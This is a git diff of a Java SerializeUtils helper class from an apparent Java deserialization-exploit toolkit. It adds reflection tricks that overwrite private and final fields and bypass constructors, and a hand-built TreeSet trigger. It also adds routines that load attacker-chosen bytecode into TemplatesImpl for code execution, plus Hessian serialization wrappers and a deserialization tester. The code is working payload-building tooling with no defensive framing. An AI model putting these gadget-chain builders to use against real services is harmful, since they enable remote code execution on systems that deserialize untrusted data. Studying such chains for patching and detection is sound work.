@@ -11,23 +11,46 @@ import javassist.CtMethod;
 import sun.reflect.ReflectionFactory;
 
 import java.io.*;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.security.*;
-import java.util.Base64;
-import java.util.HashMap;
-import java.util.HashSet;
+import java.util.*;
 
 import com.sun.org.apache.bcel.internal.util.ClassLoader;
 
 import javax.xml.transform.Templates;
 
 public class SerializeUtils {
-    public static void setFieldValue(Object obj, String field, Object arg) throws Exception{
-        Field f = obj.getClass().getDeclaredField(field);
-        f.setAccessible(true);
-        f.set(obj, arg);
+    public static Field getField(final Class<?> clazz, final String fieldName) {
+        Field field = null;
+        try {
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        } catch (NoSuchFieldException ex) {
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        }
+        return field;
+    }
+
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.setAccessible(true);
+        if(field != null) {
+            field.set(obj, value);
+        }
+    }
+    public  static void setFinalFieldValue(final Object obj, final String fieldName, final Object value) throws Exception{
+        final Field field = getField(obj.getClass(), fieldName);
+        field.setAccessible(true);
+        Field modifersField = Field.class.getDeclaredField("modifiers");
+        modifersField.setAccessible(true);
+        modifersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
+        if(field != null) {
+            field.set(obj, value);
+        }
     }
     public static void base64deserial(String data) throws Exception {
         byte[] base64decodedBytes = Base64.getDecoder().decode(data);
@@ -65,6 +88,9 @@ public class SerializeUtils {
         setFieldValue(s, "table", tbl);
         return s;
     }
+    public static Object createWithoutConstructor(String classname) throws Exception {
+        return createWithoutConstructor(Class.forName(classname));
+    }
     public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws Exception {
         return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
     }
@@ -87,6 +113,22 @@ public class SerializeUtils {
     public static void LoadBcel(String code) throws Exception {
         new ClassLoader().loadClass(code).newInstance();
     }
+    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
+        TreeMap<Object,Object> m = new TreeMap<>();
+        setFieldValue(m, "size", 2);
+        setFieldValue(m, "modCount", 2);
+        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
+        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+        Object node = nodeCons.newInstance(v1, new Object[0], null);
+        Object right = nodeCons.newInstance(v2, new Object[0], node);
+        setFieldValue(node, "right", right);
+       setFieldValue(m, "root", node);
+
+        TreeSet set = new TreeSet();
+        setFieldValue(set, "m", m);
+        return set;
+    }
     public static Templates getTemplate(String cmd) throws  Exception{
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass = pool.makeClass("a");
@@ -99,6 +141,15 @@ public class SerializeUtils {
         byte[] bytes = ctClass.toBytecode();
         TemplatesImpl templatesImpl = new TemplatesImpl();
         setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
+        setFieldValue(templatesImpl, "_name", "boogipop");
+        setFieldValue(templatesImpl, "_tfactory", null);
+        return templatesImpl;
+    }
+    public static Templates getTemplateByclass(String classpath) throws  Exception{
+        byte[] code= Files.readAllBytes(Paths.get(classpath));
+        byte[][] codes={code};
+        Templates templatesImpl = new TemplatesImpl();
+        setFieldValue(templatesImpl, "_bytecodes", codes);
         setFieldValue(templatesImpl, "_name", "boogipop");
         setFieldValue(templatesImpl, "_tfactory", null);
         return templatesImpl;
@@ -166,9 +217,61 @@ public class SerializeUtils {
         out.flushBuffer();
         return baos;
     }
-    public static void HessianDeser(ByteArrayOutputStream out) throws Exception{
+    public static void HessianDeserial(ByteArrayOutputStream out) throws Exception{
         ByteArrayInputStream bais = new ByteArrayInputStream(out.toByteArray());
         Hessian2Input input = new Hessian2Input(bais);
         input.readObject();
+    }
+    public static String HessianSerial(Object o) throws Exception{
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        Hessian2Output oos = new Hessian2Output(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
+        return base64String;
+    }
+    public static void HessianDeserial(String base64) throws Exception{
+        byte[] base64decodedBytes = Base64.getDecoder().decode(base64);
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
+        Hessian2Input ois = new Hessian2Input(bais);
+        ois.readObject();
+        ois.close();
+    }
+    public static Constructor<?> getFirstCtor(final String name) throws Exception {
+        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
+        ctor.setAccessible(true);
+        return ctor;
+    }
+    public static Constructor<?> getConstructor(String classname, Class<?>[] paramTypes) throws ClassNotFoundException, NoSuchMethodException {
+        Constructor<?> ctor = Class.forName(classname).getDeclaredConstructor(paramTypes);
+        ctor.setAccessible(true);
+        return ctor;
+    }
+
+    public static Object newInstance(String className, Object ... args) throws Exception {
+        return getFirstCtor(className).newInstance(args);
+    }
+
+    public static Object newInstance(String classname, Class<?>[] paramTypes, Object... args) throws NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, InvocationTargetException {
+        return getConstructor(classname, paramTypes).newInstance(args);
+    }
+
+    public static <T> T newInstance(Class<T> cls, Class<?>[] paramTypes, Object... args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
+        Constructor<?> ctor = cls.getDeclaredConstructor(paramTypes);
+        ctor.setAccessible(true);
+        return (T) ctor.newInstance(args);
+    }
+    //创建代理,面向单个接口
+    public static <T> T createProxy (final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
+        allIfaces[ 0 ] = iface;
+        if ( ifaces.length > 0 ) {
+            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
+        }
+        return iface.cast(Proxy.newProxyInstance(java.lang.ClassLoader.getSystemClassLoader(), allIfaces, ih));
+    }
+    public static void deserTester(Object o) throws Exception {
+        base64deserial(base64serial(o));
     }
 }
